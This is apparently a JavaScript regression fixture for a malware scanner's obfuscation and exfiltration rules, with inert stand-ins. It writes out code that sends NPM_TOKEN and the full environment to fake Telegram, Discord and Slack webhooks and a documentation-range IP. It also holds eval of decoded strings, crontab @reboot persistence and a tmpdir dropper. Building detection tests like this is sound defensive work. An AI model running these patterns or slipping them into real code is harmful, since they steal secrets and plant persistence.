// Regression fixture for the decoder-gap and C2/exfil rules (OBF-018..021,
// SC-032..038). Inert stand-ins only — fake endpoints, documentation-range
// IPs, harmless payloads. Each block exercises a rule added in VIG-7.

// OBF-018: percent-encoded payload blob decoded at runtime
const blob = unescape("%65%76%69%6c%2e%65%78%61%6d%70%6c%65");

// OBF-019: XOR charCodeAt decryption loop feeding a sink
let plain = "";
for (let i = 0; i < blob.length; i++) {
  plain += String.fromCharCode(blob.charCodeAt(i) ^ 0x2a);
}
eval(plain);

// OBF-020: fromCodePoint used instead of fromCharCode
const host = String.fromCodePoint(101, 118, 105, 108, 46, 101, 120, 97, 109, 112, 108, 101);

// OBF-021: JSFuck minimal-alphabet payload
const jsf = [][(![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[+!+[]+!+[]]+(!![]+[])[+[]]];

// SC-032: node:-prefixed require dodges bare-name rules
const cp = require("node:child_process");

// SC-033: Telegram Bot API exfil near a secret
fetch("https://api.telegram.org/bot0000:FAKE/sendMessage?chat_id=1&text=" + process.env.NPM_TOKEN);

// SC-034: Discord webhook exfil near a credential-store read
const dump = require("fs").readFileSync("/tmp/fake-leveldb.log", "utf8");
fetch("https://discord.com/api/webhooks/0000/fake", { method: "POST", body: dump });

// SC-035: raw-IP URL (TEST-NET-3, documentation range) near secret access
fetch("http://203.0.113.10/collect", { method: "POST", body: process.env.HOME });

// SC-036: crontab persistence driven by a spawn
cp.exec("crontab -l; echo '@reboot /tmp/fake' | crontab -");

// SC-037: tmpdir write-then-execute dropper
const os = require("os");
const drop = os.tmpdir() + "/.fake-payload";
require("fs").writeFileSync(drop, "echo harmless");
cp.execSync("chmod +x " + drop);

// SC-038: Slack webhook exfil near a secret
fetch("https://hooks.slack.com/services/T000/B000/fake", { method: "POST", body: JSON.stringify(process.env) });
